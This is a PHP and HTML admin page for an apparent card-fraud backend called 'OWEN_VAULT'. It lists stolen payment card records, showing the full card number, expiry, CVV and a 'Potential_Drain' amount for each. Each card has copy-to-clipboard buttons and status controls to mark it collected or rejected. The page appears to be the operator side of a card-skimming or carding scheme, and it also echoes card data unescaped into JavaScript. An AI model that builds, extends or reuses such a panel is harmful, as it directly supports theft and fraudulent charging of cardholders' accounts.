<?php
// Ajuste de ruta: Subimos un nivel para entrar a includes
require '../includes/config.php';
session_start();

// --- SEGURIDAD OWEN_VAULT ---
if (!isset($_SESSION['admin_auth'])) {
    header("Location: admin_login.php");
    exit;
}

// Acción de cambio de estatus (Cobrar/Rechazar)
if(isset($_GET['op']) && isset($_GET['id'])){
    $op = $conn->real_escape_string($_GET['op']);
    $id = intval($_GET['id']);
    $conn->query("UPDATE vault_cards SET status = '$op' WHERE id = $id");
    header("Location: admin_vault.php");
    exit;
}

// Consulta uniendo con la tabla de usuarios
$res = $conn->query("SELECT v.*, u.nombre as user_name FROM vault_cards v LEFT JOIN usuarios u ON v.user_id = u.id ORDER BY v.fecha DESC");
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>OWEN | CENTRAL_VAULT</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --bg: #000000; --card: #0a0a0a; --accent: #ff0000; --dark-red: #4c0519; --border: #1a1a1a; }
        body { background: var(--bg); color: #fff; font-family: 'Courier New', monospace; font-size: 0.85rem; }
        
        .sidebar { width: 250px; height: 100vh; position: fixed; border-right: 2px solid var(--accent); background: var(--card); padding: 30px; }
        .main-content { margin-left: 250px; padding: 50px; }
        
        .card-vault { background: #050505; border: 1px solid var(--border); border-radius: 0; margin-bottom: 25px; transition: 0.3s; padding: 25px; position: relative; overflow: hidden; }
        .card-vault:hover { border-color: var(--accent); box-shadow: 0 0 20px rgba(255,0,0,0.15); }
        .card-vault::before { content: ""; position: absolute; top: 0; left: 0; width: 3px; height: 100%; background: var(--accent); }
        
        .cc-display { background: #000; padding: 18px; border: 1px solid var(--dark-red); color: #fff; font-size: 1.4rem; letter-spacing: 5px; cursor: pointer; position: relative; transition: 0.2s; }
        .cc-display:hover { background: #0a0000; border-color: var(--accent); }
        .cc-display:active { transform: scale(0.98); }
        .cc-display::after { content: 'CLICK_TO_COPY'; position: absolute; right: 15px; font-size: 0.55rem; color: var(--dark-red); top: 5px; letter-spacing: 1px; }
        
        .label-tech { font-size: 0.6rem; color: #555; font-weight: bold; text-transform: uppercase; margin-bottom: 5px; display: block; letter-spacing: 1px; }
        .text-accent { color: var(--accent); }
        .mono { font-family: 'Courier New', monospace; }
        
        /* Status Badges Custom */
        .status-pill { font-size: 0.65rem; padding: 5px 15px; border-radius: 0; font-weight: bold; text-transform: uppercase; border: 1px solid; }
        .status-pendiente { border-color: #f59e0b; color: #f59e0b; background: rgba(245,158,11,0.05); }
        .status-cobrado { border-color: #10b981; color: #10b981; background: rgba(16,185,129,0.05); }
        .status-rechazado { border-color: var(--accent); color: var(--accent); background: rgba(255,0,0,0.05); }

        .btn-action { background: transparent; border: 1px solid #333; color: #fff; font-size: 0.65rem; border-radius: 0; }
        .btn-action:hover { border-color: var(--accent); color: var(--accent); }

        .nav-link { color: #666; transition: 0.3s; padding: 10px 0; display: block; text-decoration: none; font-weight: bold; }
        .nav-link:hover { color: var(--accent); }
    </style>
</head>
<body>

<div class="sidebar">
    <div class="mb-5 text-center">
        <i class="fas fa-vault fa-3x text-accent mb-3"></i>
        <h4 class="text-white fw-bold mono m-0">OWEN<span class="text-accent">_VAULT</span></h4>
    </div>
    <nav class="nav flex-column gap-2">
        <a href="admin_panel.php" class="nav-link"><i class="fas fa-network-wired me-2"></i> DASHBOARD</a>
        <a href="admin_vault.php" class="nav-link" style="color: var(--accent);"><i class="fas fa-microchip me-2"></i> VAULT_CARDS</a>
        <hr style="border-color: var(--dark-red);">
        <a href="logout.php" class="nav-link text-danger small"><i class="fas fa-power-off me-2"></i> SHUTDOWN</a>
    </nav>
</div>

<div class="main-content">
    <div class="d-flex justify-content-between align-items-center mb-5">
        <div>
            <h2 class="text-white fw-bold m-0 mono">CENTRAL_VAULT_DECRYPTOR</h2>
            <p class="text-secondary m-0" style="font-size: 0.7rem; letter-spacing: 2px;">ENCRYPTED_DATABASE_ACCESS // LIVE_FEED</p>
        </div>
        <div class="text-end">
            <span class="badge rounded-0 border border-danger text-danger bg-danger bg-opacity-10 px-3 py-2">
                <i class="fas fa-shield-alt me-2 fa-fade"></i> ROOT_ACCESS_GRANTED
            </span>
        </div>
    </div>

    <div class="row">
        <?php if($res->num_rows == 0): ?>
            <div class="col-12 text-center py-5 border border-dashed border-secondary opacity-25">
                <i class="fas fa-ghost fa-3x mb-3"></i>
                <p class="mono">VAULT_EMPTY: No data detected in sector.</p>
            </div>
        <?php endif; ?>

        <?php while($c = $res->fetch_assoc()): ?>
        <div class="col-xl-6">
            <div class="card-vault">
                <div class="d-flex justify-content-between mb-4">
                    <div>
                        <span class="label-tech">Source_Node</span>
                        <h6 class="text-white m-0 fw-bold text-uppercase"><?php echo htmlspecialchars($c['user_name'] ?? 'ANONYMOUS_GUEST'); ?></h6>
                    </div>
                    <div class="text-end">
                        <span class="label-tech">Process_Status</span>
                        <div class="dropdown">
                            <button class="btn btn-sm status-pill status-<?php echo $c['status']; ?> dropdown-toggle" data-bs-toggle="dropdown">
                                <?php echo strtoupper($c['status']); ?>
                            </button>
                            <ul class="dropdown-menu dropdown-menu-dark rounded-0 border-danger">
                                <li><a class="dropdown-item small text-success" href="?op=cobrado&id=<?php echo $c['id']; ?>">SET_COLLECTED</a></li>
                                <li><a class="dropdown-item small text-danger" href="?op=rechazado&id=<?php echo $c['id']; ?>">SET_REJECTED</a></li>
                                <li><hr class="dropdown-divider"></li>
                                <li><a class="dropdown-item small text-warning" href="?op=pendiente&id=<?php echo $c['id']; ?>">RESET_PENDING</a></li>
                            </ul>
                        </div>
                    </div>
                </div>

                <div class="mb-4">
                    <span class="label-tech">Financial_Identity (PAN)</span>
                    <div class="cc-display d-flex justify-content-between align-items-center" onclick="copy('<?php echo $c['cc_number']; ?>', this)">
                        <span class="mono"><?php echo implode(' ', str_split($c['cc_number'], 4)); ?></span>
                        <i class="far fa-copy opacity-25"></i>
                    </div>
                </div>

                <div class="row mb-3">
                    <div class="col-4 border-end border-dark">
                        <span class="label-tech">Expiration</span>
                        <div class="text-white fw-bold h5 mb-0 mono"><?php echo $c['cc_exp']; ?></div>
                    </div>
                    <div class="col-4 border-end border-dark ps-4">
                        <span class="label-tech">Security_Code</span>
                        <div class="text-accent fw-bold h5 mb-0 mono"><?php echo $c['cc_cvv']; ?></div>
                    </div>
                    <div class="col-4 text-end">
                        <span class="label-tech">Potential_Drain</span>
                        <div class="text-white fw-bold h5 mb-0 mono">$<?php echo number_format($c['monto_intento'], 2); ?></div>
                    </div>
                </div>

                <div class="pt-3 border-top border-dark d-flex justify-content-between align-items-center">
                    <span style="font-size: 0.55rem; color: #333;" class="mono">ID: <?php echo $c['id']; ?> | GATEWAY: <?php echo strtoupper($c['gateway']); ?></span>
                    <span style="font-size: 0.55rem; color: #333;" class="mono"><?php echo $c['fecha']; ?></span>
                </div>
            </div>
        </div>
        <?php endwhile; ?>
    </div>
</div>

<script>
    function copy(txt, el) {
        navigator.clipboard.writeText(txt);
        // Feedback visual rápido
        const originalBg = el.style.background;
        el.style.background = "#4c0519";
        setTimeout(() => { el.style.background = originalBg; }, 150);
        if (window.navigator.vibrate) window.navigator.vibrate(30);
    }
</script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
